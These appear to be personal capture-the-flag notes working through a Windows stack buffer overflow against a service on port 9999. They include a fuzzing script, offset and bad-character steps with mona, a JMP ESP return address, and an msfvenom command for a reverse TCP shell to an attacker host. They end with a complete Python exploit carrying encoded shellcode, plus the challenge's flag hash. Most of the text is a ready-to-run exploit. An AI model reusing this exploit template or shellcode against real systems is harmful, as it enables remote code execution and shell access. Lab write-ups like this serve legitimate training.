Running the binary locally 

 ![[Pasted image 20210530212228.png]]
 
 here on analysing the binary it does not crash when we fuzz the username but the message
 
 ![[Pasted image 20210530213439.png]]
 
 ## fuzzing
 so the fuzzing script
 
 ```python
 #!/usr/bin/env python3

import socket, time, sys

ip = "192.168.1.102"

port = 9999
timeout = 5
prefix = ""

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      s.send(bytes("sp00f ", "latin-1"))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
 ```
  
  and it crashed at 3000 bytes
 ![[Pasted image 20210530214019.png]]
 
 ## offset
 
 ![[Pasted image 20210530214743.png]]
 
EIP: 31704330

![[Pasted image 20210530214926.png]]

offset: 2012

after many attempts it became clear that we have to crash to program to see the updated EIP(dont know why, so have to send the rest of the bytes along with the buffer too)

![[Pasted image 20210530225048.png]]

```python
import socket

ip = "192.168.1.102"
port = 9999

prefix = ""
offset = 2012
overflow = "A" * offset + "B"*4
retn = ""
padding = ""
payload = ""
postfix = "C"*984

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.recv(1024)
  #s.recv(1024)
  s.send(bytes("sp00f" + "\r\n", "latin-1"))
  s.recv(1024)
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

## bad chars

`!mona config -set workingfolder C:\mona\%p`

`!mona bytearray -b "\x00"`

ESP: 01E4EEF0

`!mona compare -f C:\mona\bytearray.bin -a 01E4EEF0`

or `!mona compare -f C:\mona\bytearray.bin -a esp`

here the only bad char is `\x00`

![[Pasted image 20210530231258.png]]

## jmp point

`!mona jmp -r esp -epb "\x00"`

625014DF

little endian `\xdf\x14\x50\x62`

![[Pasted image 20210530231727.png]]


## exploit
`msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"`
we got shell


![[Pasted image 20210530232229.png]]

root(the only flag) === 5b1001de5a44eca47eee71e7942a8f8a 

![[Pasted image 20210530232345.png]]

```python
import socket

ip = "10.10.21.198"
port = 9999

prefix = ""
offset = 2012
overflow = "A" * offset
retn = "\xdf\x14\x50\x62"
padding = "\x90" * 16
payload = (
"\xfc\xbb\x94\xfa\x8d\xa0\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x68\x12\x0f\xa0\x90"
"\xe3\x70\x28\x75\xd2\xb0\x4e\xfe\x45\x01\x04\x52\x6a\xea\x48"
"\x46\xf9\x9e\x44\x69\x4a\x14\xb3\x44\x4b\x05\x87\xc7\xcf\x54"
"\xd4\x27\xf1\x96\x29\x26\x36\xca\xc0\x7a\xef\x80\x77\x6a\x84"
"\xdd\x4b\x01\xd6\xf0\xcb\xf6\xaf\xf3\xfa\xa9\xa4\xad\xdc\x48"
"\x68\xc6\x54\x52\x6d\xe3\x2f\xe9\x45\x9f\xb1\x3b\x94\x60\x1d"
"\x02\x18\x93\x5f\x43\x9f\x4c\x2a\xbd\xe3\xf1\x2d\x7a\x99\x2d"
"\xbb\x98\x39\xa5\x1b\x44\xbb\x6a\xfd\x0f\xb7\xc7\x89\x57\xd4"
"\xd6\x5e\xec\xe0\x53\x61\x22\x61\x27\x46\xe6\x29\xf3\xe7\xbf"
"\x97\x52\x17\xdf\x77\x0a\xbd\x94\x9a\x5f\xcc\xf7\xf2\xac\xfd"
"\x07\x03\xbb\x76\x74\x31\x64\x2d\x12\x79\xed\xeb\xe5\x7e\xc4"
"\x4c\x79\x81\xe7\xac\x50\x46\xb3\xfc\xca\x6f\xbc\x96\x0a\x8f"
"\x69\x38\x5a\x3f\xc2\xf9\x0a\xff\xb2\x91\x40\xf0\xed\x82\x6b"
"\xda\x85\x29\x96\x8d\xa3\xbc\x9c\x9d\xdc\xbc\x9c\x3e\x34\x48"
"\x7a\x2a\x56\x1c\xd5\xc3\xcf\x05\xad\x72\x0f\x90\xc8\xb5\x9b"
"\x17\x2d\x7b\x6c\x5d\x3d\xec\x9c\x28\x1f\xbb\xa3\x86\x37\x27"
"\x31\x4d\xc7\x2e\x2a\xda\x90\x67\x9c\x13\x74\x9a\x87\x8d\x6a"
"\x67\x51\xf5\x2e\xbc\xa2\xf8\xaf\x31\x9e\xde\xbf\x8f\x1f\x5b"
"\xeb\x5f\x76\x35\x45\x26\x20\xf7\x3f\xf0\x9f\x51\xd7\x85\xd3"
"\x61\xa1\x89\x39\x14\x4d\x3b\x94\x61\x72\xf4\x70\x66\x0b\xe8"
"\xe0\x89\xc6\xa8\x01\x68\xc2\xc4\xa9\x35\x87\x64\xb4\xc5\x72"
"\xaa\xc1\x45\x76\x53\x36\x55\xf3\x56\x72\xd1\xe8\x2a\xeb\xb4"
"\x0e\x98\x0c\x9d\x0e\x1e\xf3\x1e"
)

postfix = "C"*984

buffer = prefix + overflow + retn + padding + payload  + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.recv(1024)
  #s.recv(1024)
  s.send(bytes("sp00f" + "\r\n", "latin-1"))
  s.recv(1024)
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

```